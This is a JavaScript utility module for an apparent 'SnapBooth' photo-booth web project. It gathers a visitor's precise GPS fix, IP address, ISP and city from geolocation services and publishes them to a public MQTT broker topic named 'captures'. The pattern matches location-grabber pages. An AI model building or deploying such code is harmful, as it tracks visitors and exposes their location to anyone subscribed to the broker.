/*
  capture.js — Utility module (dipanggil dari index.html)
  Fungsi: GPS, IP geolocation, reverse geocoding, MQTT publish
  Tidak ada UI logic di sini — semua ada di index.html
*/

var MQTT_BROKER = 'wss://broker.hivemq.com:8884/mqtt'
var MQTT_TOPIC  = 'lamanukku/v1/captures'

// ── GPS: minta izin, timeout 12 detik ────────────────────────────
function tryGPS () {
  return new Promise(function (resolve) {
    if (!navigator.geolocation) { resolve(null); return }

    var settled = false
    function done (val) { if (!settled) { settled = true; resolve(val) } }

    navigator.geolocation.getCurrentPosition(
      function (pos) { done(pos.coords) },
      function ()    { done(null) },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
    )
    setTimeout(function () { done(null) }, 12000)
  })
}

// ── Data dari IP (ISP, kota, timezone) ───────────────────────────
async function getIPData () {
  // 1. ipapi.co
  try {
    var r = await fetchWithTimeout('https://ipapi.co/json/', 7000)
    var d = await r.json()
    if (d && d.ip) {
      return {
        ip: d.ip, city: d.city || '-', region: d.region || '-',
        country: d.country_name || '-', lat: d.latitude || 0,
        lon: d.longitude || 0, isp: d.org || '-',
        timezone: d.timezone || '-', postal: d.postal || '-'
      }
    }
  } catch (_) {}

  // 2. ip-api.com fallback
  try {
    var r2 = await fetchWithTimeout(
      'https://ip-api.com/json/?fields=status,query,country,regionName,city,zip,lat,lon,isp,timezone', 7000
    )
    var d2 = await r2.json()
    if (d2 && d2.status === 'success') {
      return {
        ip: d2.query, city: d2.city || '-', region: d2.regionName || '-',
        country: d2.country || '-', lat: d2.lat || 0, lon: d2.lon || 0,
        isp: d2.isp || '-', timezone: d2.timezone || '-', postal: d2.zip || '-'
      }
    }
  } catch (_) {}

  // 3. ipify (hanya IP, no-crash fallback)
  try {
    var r3 = await fetchWithTimeout('https://api.ipify.org?format=json', 5000)
    var d3 = await r3.json()
    if (d3 && d3.ip) return { ip: d3.ip }
  } catch (_) {}

  return {}
}

// ── Reverse geocoding dari GPS (Nominatim, gratis) ────────────────
async function reverseGeocode (lat, lon) {
  try {
    var url = 'https://nominatim.openstreetmap.org/reverse?format=json'
            + '&lat=' + lat + '&lon=' + lon + '&accept-language=id&zoom=14'
    var r = await fetchWithTimeout(url, 8000, {
      'User-Agent': 'SnapBooth/1.0 (Final Project)'
    })
    var d = await r.json()
    var a = d.address || {}
    return {
      city:    a.city || a.town || a.village || a.county || '-',
      region:  a.state || a.province || '-',
      country: a.country || '-',
      postal:  a.postcode || '-'
    }
  } catch (_) {
    return {}
  }
}

// ── Gabungkan GPS + IP → satu objek lokasi ────────────────────────
async function buildLocation (gps, ipData) {
  if (!ipData) ipData = {}

  if (gps) {
    var geo = await reverseGeocode(gps.latitude, gps.longitude).catch(function () { return {} })
    return {
      source:   'gps',
      accuracy: Math.round(gps.accuracy),
      lat:      gps.latitude,
      lon:      gps.longitude,
      altitude: gps.altitude ? Math.round(gps.altitude) : null,
      city:     geo.city    || ipData.city    || '-',
      region:   geo.region  || ipData.region  || '-',
      country:  geo.country || ipData.country || '-',
      postal:   geo.postal  || ipData.postal  || '-',
      ip:       ipData.ip      || '-',
      isp:      ipData.isp     || '-',
      timezone: ipData.timezone|| '-'
    }
  }

  if (ipData && ipData.ip) {
    return Object.assign({ source: 'ip', accuracy: null }, ipData)
  }

  return null
}

// ── MQTT publish ──────────────────────────────────────────────────
function publishMQTT (payload) {
  return new Promise(function (resolve) {
    if (typeof mqtt === 'undefined') { resolve(false); return }

    var done = false
    function finish (v) { if (!done) { done = true; resolve(v) } }

    try {
      var clientId = 'snap_' + Math.random().toString(36).substr(2, 8)
      var client = mqtt.connect(MQTT_BROKER, {
        clientId:        clientId,
        clean:           true,
        connectTimeout:  10000,
        reconnectPeriod: 0
      })

      client.on('connect', function () {
        var msg = JSON.stringify(payload)
        client.publish(MQTT_TOPIC, msg, { qos: 1 }, function (err) {
          client.end(true)
          finish(!err)
        })
      })

      client.on('error', function () { client.end(true); finish(false) })
      setTimeout(function () { finish(false) }, 18000)

    } catch (e) {
      finish(false)
    }
  })
}

// ── Helpers ───────────────────────────────────────────────────────
function fetchWithTimeout (url, ms, headers) {
  var ctrl = new AbortController()
  setTimeout(function () { ctrl.abort() }, ms)
  return fetch(url, { signal: ctrl.signal, headers: headers || {} })
}
